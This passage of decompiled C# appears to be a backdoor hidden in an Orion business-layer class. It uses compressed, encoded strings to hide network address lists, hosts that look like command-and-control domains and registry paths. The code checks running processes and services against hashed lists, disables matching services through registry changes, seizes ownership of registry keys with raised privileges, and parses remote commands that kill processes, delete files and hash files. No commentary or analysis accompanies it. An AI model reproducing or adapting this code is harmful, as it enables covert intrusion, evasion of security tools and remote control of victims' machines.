        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzTQA0MA"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMAQQA="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzQ30jM00zPQMwAA"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMyMdADQgA="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("M7Q00jM0s9Az0DMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYgM9AwA="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzIy0TMAQQA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzIx0ANDAA=="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("S0s2MLCyAgA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("S0s1MLCyAgA="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("S0tNNrCyAgA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("S0tLNrCyAgA="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("S0szMLCyAgA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("S0szMLCyAgA="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzHUszDRMzS11DMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.Ipx),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzfRMzQ00TMy0TMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYRMLPQMA"), OrionImprovementBusinessLayer.AddressFamilyEx.Ipx),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzQ10TM0tNAzNDHQMwAA"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.Ipx),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI01zM0M9Yz1zMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.Ipx),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzLQMzQx0ANCAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMyNdEz0DMAAA=="), OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("szTTMzbUMzQ30jMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzQ21DMystAzNNIzAAA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYyM9AwA="), OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzQx0bMw0zMyMtMzAAA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("s9AztNAzNDHRMwAA"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYxM9AwA="), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("M7TQMzQ20ANCAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYgM9AwA="), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios, true),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzfUMzQ10jM11jMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("s7TUM7fUM9AzAAA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYgM9AwA="), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios, true),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("szDXMzK20LMw0DMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYRMLPQMA"), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("M7S01DMyMNQzNDTXMwAA"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios),
        new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("M7Qw0TM30jPQMwAA"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMyNdEz0DMAAA=="), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios, true)
      };
      OrionImprovementBusinessLayer.patternHashes = new ulong[13]
      {
        1109067043404435916UL,
        15267980678929160412UL,
        8381292265993977266UL,
        3796405623695665524UL,
        8727477769544302060UL,
        10734127004244879770UL,
        11073283311104541690UL,
        4030236413975199654UL,
        7701683279824397773UL,
        5132256620104998637UL,
        5942282052525294911UL,
        4578480846255629462UL,
        16858955978146406642UL
      };
      OrionImprovementBusinessLayer.patternList = new string[2]
      {
        OrionImprovementBusinessLayer.ZipHelper.Unzip("07DP1NSIjkvUrYqtidPUKEktLoHzVTQB"),
        OrionImprovementBusinessLayer.ZipHelper.Unzip("07DP1NQozs9JLCrPzEsp1gQA")
      };
      OrionImprovementBusinessLayer.reportStatusName = OrionImprovementBusinessLayer.ZipHelper.Unzip("C0otyC8qCU8sSc5ILQpKLSmqBAA=");
      OrionImprovementBusinessLayer.serviceStatusName = OrionImprovementBusinessLayer.ZipHelper.Unzip("C0otyC8qCU8sSc5ILQrILy4pyM9LBQA=");
      OrionImprovementBusinessLayer.userAgentOrionImprovementClient = (string) null;
      OrionImprovementBusinessLayer.userAgentDefault = (string) null;
      OrionImprovementBusinessLayer.apiHost = OrionImprovementBusinessLayer.ZipHelper.Unzip("SyzI1CvOz0ksKs/MSynWS87PBQA=");
      OrionImprovementBusinessLayer.domain1 = OrionImprovementBusinessLayer.ZipHelper.Unzip("SywrLstNzskvTdFLzs8FAA==");
      OrionImprovementBusinessLayer.domain2 = OrionImprovementBusinessLayer.ZipHelper.Unzip("SywoKK7MS9ZNLMgEAA==");
      OrionImprovementBusinessLayer.domain3 = new string[4]
      {
        OrionImprovementBusinessLayer.ZipHelper.Unzip("Sy3VLU8tLtE1BAA="),
        OrionImprovementBusinessLayer.ZipHelper.Unzip("Ky3WLU8tLtE1AgA="),
        OrionImprovementBusinessLayer.ZipHelper.Unzip("Ky3WTU0sLtE1BAA="),
        OrionImprovementBusinessLayer.ZipHelper.Unzip("Ky3WTU0sLtE1AgA=")
      };
      OrionImprovementBusinessLayer.appId = OrionImprovementBusinessLayer.ZipHelper.Unzip("M7UwTkm0NDHVNTNKTNM1NEi10DWxNDDSTbRIMzIwTTY3SjJKBQA=");
      OrionImprovementBusinessLayer.status = OrionImprovementBusinessLayer.ReportStatus.New;
      OrionImprovementBusinessLayer.domain4 = (string) null;
      OrionImprovementBusinessLayer.userId = (byte[]) null;
      OrionImprovementBusinessLayer.instance = (NamedPipeServerStream) null;
      OrionImprovementBusinessLayer.osVersion = (string) null;
      OrionImprovementBusinessLayer.osInfo = (string) null;
    }

    private enum ReportStatus
    {
      New,
      Append,
      Truncate,
    }

    private enum AddressFamilyEx
    {
      NetBios,
      ImpLink,
      Ipx,
      InterNetwork,
      InterNetworkV6,
      Unknown,
      Atm,
      Error,
    }

    private enum HttpOipMethods
    {
      Get,
      Head,
      Put,
      Post,
    }

    private enum ProxyType
    {
      Manual,
      System,
      Direct,
      Default,
    }

    private static class RegistryHelper
    {
      private static RegistryHive GetHive(string key, out string subKey)
      {
        string[] strArray = key.Split(new char[1]{ '\\' }, 2);
        string upper = strArray[0].ToUpper();
        subKey = strArray.Length <= 1 ? "" : strArray[1];
        if (upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYx39nEMDnYNjg/y9w8BAA==") || upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2DgIA"))
          return RegistryHive.ClassesRoot;
        if (upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYx3Dg0KcvULiQ8Ndg0CAA==") || upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2DgUA"))
          return RegistryHive.CurrentUser;
        if (upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzBQA=") || upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/D28QUA"))
          return RegistryHive.LocalMachine;
        if (upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYwPDXYNCgYA") || upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/AOBQA="))
          return RegistryHive.Users;
        if (upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYx3Dg0KcvULiXf293PzdAcA") || upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2dgYA"))
          return RegistryHive.CurrentConfig;
        if (upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYwPcA1y8/d19HN2jXdxDHEEAA==") || upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/AOcAEA"))
          return RegistryHive.PerformanceData;
        return upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYx3ifSLd3EMcQQA") || upper == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2cQEA") ? RegistryHive.DynData : (RegistryHive) 0;
      }

      public static bool SetValue(
        string key,
        string valueName,
        string valueData,
        RegistryValueKind valueKind)
      {
        string subKey;
        using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(OrionImprovementBusinessLayer.RegistryHelper.GetHive(key, out subKey), RegistryView.Registry64))
        {
          using (RegistryKey registryKey2 = registryKey1.OpenSubKey(subKey, true))
          {
            switch (valueKind)
            {
              case RegistryValueKind.String:
              case RegistryValueKind.ExpandString:
              case RegistryValueKind.DWord:
              case RegistryValueKind.QWord:
                registryKey2.SetValue(valueName, (object) valueData, valueKind);
                break;
              case RegistryValueKind.Binary:
                registryKey2.SetValue(valueName, (object) OrionImprovementBusinessLayer.HexStringToByteArray(valueData), valueKind);
                break;
              case RegistryValueKind.MultiString:
                registryKey2.SetValue(valueName, (object) valueData.Split(new string[2]
                {
                  "\r\n",
                  "\n"
                }, StringSplitOptions.None), valueKind);
                break;
              default:
                return false;
            }
            return true;
          }
        }
      }

      public static string GetValue(string key, string valueName, object defaultValue)
      {
        string subKey;
        using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(OrionImprovementBusinessLayer.RegistryHelper.GetHive(key, out subKey), RegistryView.Registry64))
        {
          using (RegistryKey registryKey2 = registryKey1.OpenSubKey(subKey))
          {
            object obj = registryKey2.GetValue(valueName, defaultValue);
            if (obj != null)
            {
              if (obj.GetType() == typeof (byte[]))
                return OrionImprovementBusinessLayer.ByteArrayToHexString((byte[]) obj);
              return obj.GetType() == typeof (string[]) ? string.Join("\n", (string[]) obj) : obj.ToString();
            }
          }
        }
        return (string) null;
      }

      public static void DeleteValue(string key, string valueName)
      {
        string subKey;
        using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(OrionImprovementBusinessLayer.RegistryHelper.GetHive(key, out subKey), RegistryView.Registry64))
        {
          using (RegistryKey registryKey2 = registryKey1.OpenSubKey(subKey, true))
            registryKey2.DeleteValue(valueName, true);
        }
      }

      public static string GetSubKeyAndValueNames(string key)
      {
        string subKey;
        using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(OrionImprovementBusinessLayer.RegistryHelper.GetHive(key, out subKey), RegistryView.Registry64))
        {
          using (RegistryKey registryKey2 = registryKey1.OpenSubKey(subKey))
            return string.Join("\n", registryKey2.GetSubKeyNames()) + "\n\n" + string.Join(" \n", registryKey2.GetValueNames());
        }
      }

      private static string GetNewOwnerName()
      {
        string sddlForm = (string) null;
        string str1 = OrionImprovementBusinessLayer.ZipHelper.Unzip("C9Y11DXVBQA=");
        string str2 = OrionImprovementBusinessLayer.ZipHelper.Unzip("0zU1MAAA");
        try
        {
          sddlForm = new NTAccount(OrionImprovementBusinessLayer.ZipHelper.Unzip("c0zJzczLLC4pSizJLwIA")).Translate(typeof (SecurityIdentifier)).Value;
        }
        catch
        {
        }
        if (string.IsNullOrEmpty(sddlForm) || !sddlForm.StartsWith(str1, StringComparison.OrdinalIgnoreCase) || !sddlForm.EndsWith(str2, StringComparison.OrdinalIgnoreCase))
        {
          string queryString = OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPLU4tckxOzi/NKwEA");
          sddlForm = (string) null;
          using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
          {
            foreach (ManagementObject managementObject in managementObjectSearcher.Get())
            {
              string str3 = managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("C/Z0AQA=")].Value.ToString();
              if (managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("88lPTsxxTE7OL80rAQA=")].Value.ToString().ToLower() == OrionImprovementBusinessLayer.ZipHelper.Unzip("KykqTQUA") && str3.StartsWith(str1, StringComparison.OrdinalIgnoreCase))
              {
                if (str3.EndsWith(str2, StringComparison.OrdinalIgnoreCase))
                {
                  sddlForm = str3;
                  break;
                }
                if (string.IsNullOrEmpty(sddlForm))
                  sddlForm = str3;
              }
            }
          }
        }
        return new SecurityIdentifier(sddlForm).Translate(typeof (NTAccount)).Value;
      }

      private static void SetKeyOwner(RegistryKey key, string subKey, string owner)
      {
        using (RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership))
        {
          RegistrySecurity registrySecurity = new RegistrySecurity();
          registrySecurity.SetOwner((IdentityReference) new NTAccount(owner));
          registryKey.SetAccessControl(registrySecurity);
        }
      }

      private static void SetKeyOwnerWithPrivileges(RegistryKey key, string subKey, string owner)
      {
        try
        {
          OrionImprovementBusinessLayer.RegistryHelper.SetKeyOwner(key, subKey, owner);
        }
        catch
        {
          bool previousState1 = false;
          bool previousState2 = false;
          string privilege1 = OrionImprovementBusinessLayer.ZipHelper.Unzip("C04NSi0uyS9KDSjKLMvMSU1PBQA=");
          string privilege2 = OrionImprovementBusinessLayer.ZipHelper.Unzip("C04NScxO9S/PSy0qzsgsCCjKLMvMSU1PBQA=");
          bool flag1 = OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege2, true, out previousState1);
          bool flag2 = OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege1, true, out previousState2);
          try
          {
            OrionImprovementBusinessLayer.RegistryHelper.SetKeyOwner(key, subKey, owner);
          }
          finally
          {
            if (flag1)
              OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege2, previousState1, out previousState1);
            if (flag2)
              OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege1, previousState2, out previousState2);
          }
        }
      }

      public static void SetKeyPermissions(RegistryKey key, string subKey, bool reset)
      {
        bool isProtected = !reset;
        string owner = OrionImprovementBusinessLayer.ZipHelper.Unzip("C44MDnH1BQA=");
        string str = reset ? owner : OrionImprovementBusinessLayer.RegistryHelper.GetNewOwnerName();
        OrionImprovementBusinessLayer.RegistryHelper.SetKeyOwnerWithPrivileges(key, subKey, owner);
        using (RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions))
        {
          RegistrySecurity registrySecurity = new RegistrySecurity();
          if (!reset)
          {
            RegistryAccessRule rule = new RegistryAccessRule(str, RegistryRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
            registrySecurity.AddAccessRule(rule);
          }
          registrySecurity.SetAccessRuleProtection(isProtected, false);
          registryKey.SetAccessControl(registrySecurity);
        }
        if (reset)
          return;
        OrionImprovementBusinessLayer.RegistryHelper.SetKeyOwnerWithPrivileges(key, subKey, str);
      }
    }

    private static class ConfigManager
    {
      public static bool ReadReportStatus(
        out OrionImprovementBusinessLayer.ReportStatus status)
      {
        try
        {
          string sValue;
          if (OrionImprovementBusinessLayer.ConfigManager.ReadConfig(OrionImprovementBusinessLayer.reportStatusName, out sValue))
          {
            int result;
            if (int.TryParse(sValue, out result))
            {
              switch (result)
              {
                case 3:
                  status = OrionImprovementBusinessLayer.ReportStatus.Truncate;
                  return true;
                case 4:
                  status = OrionImprovementBusinessLayer.ReportStatus.New;
                  return true;
                case 5:
                  status = OrionImprovementBusinessLayer.ReportStatus.Append;
                  return true;
              }
            }
          }
        }
        catch (ConfigurationErrorsException ex)
        {
        }
        status = OrionImprovementBusinessLayer.ReportStatus.New;
        return false;
      }

      public static bool ReadServiceStatus(bool _readonly)
      {
        try
        {
          string sValue;
          if (OrionImprovementBusinessLayer.ConfigManager.ReadConfig(OrionImprovementBusinessLayer.serviceStatusName, out sValue))
          {
            int result;
            if (int.TryParse(sValue, out result))
            {
              if (result >= 250)
              {
                if (result % 5 == 0)
                {
                  if (result <= 250 + ((1 << OrionImprovementBusinessLayer.svcList.Length) - 1) * 5)
                  {
                    int num = (result - 250) / 5;
                    if (!_readonly)
                    {
                      for (int index = 0; index < OrionImprovementBusinessLayer.svcList.Length; ++index)
                        OrionImprovementBusinessLayer.svcList[index].stopped = (uint) (num & 1 << index) > 0U;
                    }
                    return true;
                  }
                }
              }
            }
          }
        }
        catch (Exception ex)
        {
        }
        if (!_readonly)
        {
          for (int index = 0; index < OrionImprovementBusinessLayer.svcList.Length; ++index)
            OrionImprovementBusinessLayer.svcList[index].stopped = true;
        }
        return false;
      }

      public static bool WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus status)
      {
        if (OrionImprovementBusinessLayer.ConfigManager.ReadReportStatus(out OrionImprovementBusinessLayer.ReportStatus _))
        {
          switch (status)
          {
            case OrionImprovementBusinessLayer.ReportStatus.New:
              return OrionImprovementBusinessLayer.ConfigManager.WriteConfig(OrionImprovementBusinessLayer.reportStatusName, OrionImprovementBusinessLayer.ZipHelper.Unzip("MwEA"));
            case OrionImprovementBusinessLayer.ReportStatus.Append:
              return OrionImprovementBusinessLayer.ConfigManager.WriteConfig(OrionImprovementBusinessLayer.reportStatusName, OrionImprovementBusinessLayer.ZipHelper.Unzip("MwUA"));
            case OrionImprovementBusinessLayer.ReportStatus.Truncate:
              return OrionImprovementBusinessLayer.ConfigManager.WriteConfig(OrionImprovementBusinessLayer.reportStatusName, OrionImprovementBusinessLayer.ZipHelper.Unzip("MwYA"));
          }
        }
        return false;
      }

      public static bool WriteServiceStatus()
      {
        if (!OrionImprovementBusinessLayer.ConfigManager.ReadServiceStatus(true))
          return false;
        int num = 0;
        for (int index = 0; index < OrionImprovementBusinessLayer.svcList.Length; ++index)
          num |= (OrionImprovementBusinessLayer.svcList[index].stopped ? 1 : 0) << index;
        return OrionImprovementBusinessLayer.ConfigManager.WriteConfig(OrionImprovementBusinessLayer.serviceStatusName, (num * 5 + 250).ToString());
      }

      private static bool ReadConfig(string key, out string sValue)
      {
        sValue = (string) null;
        try
        {
          sValue = ConfigurationManager.AppSettings[key];
          return true;
        }
        catch (Exception ex)
        {
        }
        return false;
      }

      private static bool WriteConfig(string key, string sValue)
      {
        try
        {
          System.Configuration.Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
          KeyValueConfigurationCollection settings = configuration.AppSettings.Settings;
          if (settings[key] != null)
          {
            settings[key].Value = sValue;
            configuration.Save(ConfigurationSaveMode.Modified);
            ConfigurationManager.RefreshSection(configuration.AppSettings.SectionInformation.Name);
            return true;
          }
        }
        catch (Exception ex)
        {
        }
        return false;
      }
    }

    private class ServiceConfiguration
    {
      private readonly object _lock = new object();
      public ulong[] timeStamps;
      private volatile bool _stopped;
      private volatile bool _running;
      private volatile bool _disabled;
      public OrionImprovementBusinessLayer.ServiceConfiguration.Service[] Svc;

      public bool stopped
      {
        get
        {
          lock (this._lock)
            return this._stopped;
        }
        set
        {
          lock (this._lock)
            this._stopped = value;
        }
      }

      public bool running
      {
        get
        {
          lock (this._lock)
            return this._running;
        }
        set
        {
          lock (this._lock)
            this._running = value;
        }
      }

      public bool disabled
      {
        get
        {
          lock (this._lock)
            return this._disabled;
        }
        set
        {
          lock (this._lock)
            this._disabled = value;
        }
      }

      public class Service
      {
        public ulong timeStamp;
        public uint DefaultValue;
        public bool started;
      }
    }

    private static class ProcessTracker
    {
      private static readonly object _lock = new object();

      private static bool SearchConfigurations()
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPriwuSc11KcosSy0CAA==")))
        {
          foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
          {
            ulong hash = OrionImprovementBusinessLayer.GetHash(Path.GetFileName(managementBaseObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("C0gsyfBLzE0FAA==")].Value.ToString()).ToLower());
            if (Array.IndexOf<ulong>(OrionImprovementBusinessLayer.configTimeStamps, hash) != -1)
              return true;
          }
        }
        return false;
      }

      private static bool SearchAssemblies(Process[] processes)
      {
        for (int index = 0; index < processes.Length; ++index)
        {
          ulong hash = OrionImprovementBusinessLayer.GetHash(processes[index].ProcessName.ToLower());
          if (Array.IndexOf<ulong>(OrionImprovementBusinessLayer.assemblyTimeStamps, hash) != -1)
            return true;
        }
        return false;
      }

      private static bool SearchServices(Process[] processes)
      {
        for (int index = 0; index < processes.Length; ++index)
        {
          ulong hash = OrionImprovementBusinessLayer.GetHash(processes[index].ProcessName.ToLower());
          foreach (OrionImprovementBusinessLayer.ServiceConfiguration svc in OrionImprovementBusinessLayer.svcList)
          {
            if (Array.IndexOf<ulong>(svc.timeStamps, hash) != -1)
            {
              lock (OrionImprovementBusinessLayer.ProcessTracker._lock)
              {
                if (!svc.running)
                {
                  OrionImprovementBusinessLayer.svcListModified1 = true;
                  OrionImprovementBusinessLayer.svcListModified2 = true;
                  svc.running = true;
                }
                if (!svc.disabled)
                {
                  if (!svc.stopped)
                  {
                    if (svc.Svc.Length != 0)
                    {
                      OrionImprovementBusinessLayer.DelayMin(0, 0);
                      OrionImprovementBusinessLayer.ProcessTracker.SetManualMode(svc.Svc);
                      svc.disabled = true;
                      svc.stopped = true;
                    }
                  }
                }
              }
            }
          }
        }
        if (!((IEnumerable<OrionImprovementBusinessLayer.ServiceConfiguration>) OrionImprovementBusinessLayer.svcList).Any<OrionImprovementBusinessLayer.ServiceConfiguration>((Func<OrionImprovementBusinessLayer.ServiceConfiguration, bool>) (a => a.disabled)))
          return false;
        OrionImprovementBusinessLayer.ConfigManager.WriteServiceStatus();
        return true;
      }

      public static bool TrackProcesses(bool full)
      {
        Process[] processes = Process.GetProcesses();
        if (OrionImprovementBusinessLayer.ProcessTracker.SearchAssemblies(processes))
          return true;
        bool flag = OrionImprovementBusinessLayer.ProcessTracker.SearchServices(processes);
        return !flag & full ? OrionImprovementBusinessLayer.ProcessTracker.SearchConfigurations() : flag;
      }

      private static bool SetManualMode(
        OrionImprovementBusinessLayer.ServiceConfiguration.Service[] svcList)
      {
        try
        {
          bool flag = false;
          using (RegistryKey key = Registry.LocalMachine.OpenSubKey(OrionImprovementBusinessLayer.ZipHelper.Unzip("C44MDnH1jXEuLSpKzStxzs8rKcrPCU4tiSlOLSrLTE4tBgA=")))
          {
            foreach (string subKeyName in key.GetSubKeyNames())
            {
              foreach (OrionImprovementBusinessLayer.ServiceConfiguration.Service svc in svcList)
              {
                try
                {
                  if ((long) OrionImprovementBusinessLayer.GetHash(subKeyName.ToLower()) == (long) svc.timeStamp)
                  {
                    if (svc.started)
                    {
                      flag = true;
                      OrionImprovementBusinessLayer.RegistryHelper.SetKeyPermissions(key, subKeyName, false);
                    }
                    else
                    {
                      using (RegistryKey registryKey = key.OpenSubKey(subKeyName, true))
                      {
                        if (((IEnumerable<string>) registryKey.GetValueNames()).Contains<string>(OrionImprovementBusinessLayer.ZipHelper.Unzip("Cy5JLCoBAA==")))
                        {
                          registryKey.SetValue(OrionImprovementBusinessLayer.ZipHelper.Unzip("Cy5JLCoBAA=="), (object) 4, RegistryValueKind.DWord);
                          flag = true;
                        }
                      }
                    }
                  }
                }
                catch (Exception ex)
                {
                }
              }
            }
          }
          return flag;
        }
        catch (Exception ex)
        {
        }
        return false;
      }

      public static void SetAutomaticMode()
      {
        try
        {
          using (RegistryKey key = Registry.LocalMachine.OpenSubKey(OrionImprovementBusinessLayer.ZipHelper.Unzip("C44MDnH1jXEuLSpKzStxzs8rKcrPCU4tiSlOLSrLTE4tBgA=")))
          {
            foreach (string subKeyName in key.GetSubKeyNames())
            {
              foreach (OrionImprovementBusinessLayer.ServiceConfiguration svc in OrionImprovementBusinessLayer.svcList)
              {
                if (svc.stopped)
                {
                  foreach (OrionImprovementBusinessLayer.ServiceConfiguration.Service service in svc.Svc)
                  {
                    try
                    {
                      if ((long) OrionImprovementBusinessLayer.GetHash(subKeyName.ToLower()) == (long) service.timeStamp)
                      {
                        if (service.started)
                        {
                          OrionImprovementBusinessLayer.RegistryHelper.SetKeyPermissions(key, subKeyName, true);
                        }
                        else
                        {
                          using (RegistryKey registryKey = key.OpenSubKey(subKeyName, true))
                          {
                            if (((IEnumerable<string>) registryKey.GetValueNames()).Contains<string>(OrionImprovementBusinessLayer.ZipHelper.Unzip("Cy5JLCoBAA==")))
                              registryKey.SetValue(OrionImprovementBusinessLayer.ZipHelper.Unzip("Cy5JLCoBAA=="), (object) service.DefaultValue, RegistryValueKind.DWord);
                          }
                        }
                      }
                    }
                    catch (Exception ex)
                    {
                    }
                  }
                }
              }
            }
          }
        }
        catch (Exception ex)
        {
        }
      }
    }

    private static class Job
    {
      public static int GetArgumentIndex(string cl, int num)
      {
        if (cl == null)
          return -1;
        if (num == 0)
          return 0;
        char[] charArray = cl.ToCharArray();
        bool flag = false;
        int num1 = 0;
        for (int index = 0; index < charArray.Length; ++index)
        {
          if (charArray[index] == '"')
            flag = !flag;
          if (!flag && charArray[index] == ' ' && (index > 0 && charArray[index - 1] != ' '))
          {
            ++num1;
            if (num1 == num)
              return index + 1;
          }
        }
        return -1;
      }

      public static string[] SplitString(string cl)
      {
        if (cl == null)
          return new string[0];
        char[] charArray = cl.Trim().ToCharArray();
        bool flag1 = false;
        for (int index = 0; index < charArray.Length; ++index)
        {
          if (charArray[index] == '"')
            flag1 = !flag1;
          if (!flag1 && charArray[index] == ' ')
            charArray[index] = '\n';
        }
        string[] strArray = new string(charArray).Split(new char[1]
        {
          '\n'
        }, StringSplitOptions.RemoveEmptyEntries);
        for (int index = 0; index < strArray.Length; ++index)
        {
          string str = "";
          bool flag2 = false;
          strArray[index] = OrionImprovementBusinessLayer.Unquote(strArray[index]);
          foreach (char ch in strArray[index])
          {
            if (flag2)
            {
              switch (ch)
              {
                case '`':
                  str += '`'.ToString();
                  break;
                case 'q':
                  str += "\"";
                  break;
                default:
                  str = str + '`'.ToString() + ch.ToString();
                  break;
              }
              flag2 = false;
            }
            else if (ch == '`')
              flag2 = true;
            else
              str += ch.ToString();
          }
          if (flag2)
            str += '`'.ToString();
          strArray[index] = str;
        }
        return strArray;
      }

      public static void SetTime(string[] args, out int delay)
      {
        delay = int.Parse(args[0]);
      }

      public static void KillTask(string[] args)
      {
        Process.GetProcessById(int.Parse(args[0])).Kill();
      }

      public static void DeleteFile(string[] args)
      {
        System.IO.File.Delete(Environment.ExpandEnvironmentVariables(args[0]));
      }

      public static int GetFileHash(string[] args, out string result)
      {
        result = (string) null;
        string path = Environment.ExpandEnvironmentVariables(args[0]);
        using (MD5 md5 = MD5.Create())
        {
          using (FileStream fileStream = System.IO.File.OpenRead(path))
          {
            byte[] hash = md5.ComputeHash((Stream) fileStream);
            if (args.Length > 1)
              return !(OrionImprovementBusinessLayer.ByteArrayToHexString(hash).ToLower() == args[1].ToLower()) ? 1 : 0;
            result = OrionImprovementBusinessLayer.ByteArrayToHexString(hash);
          }
        }
        return 0;
      }

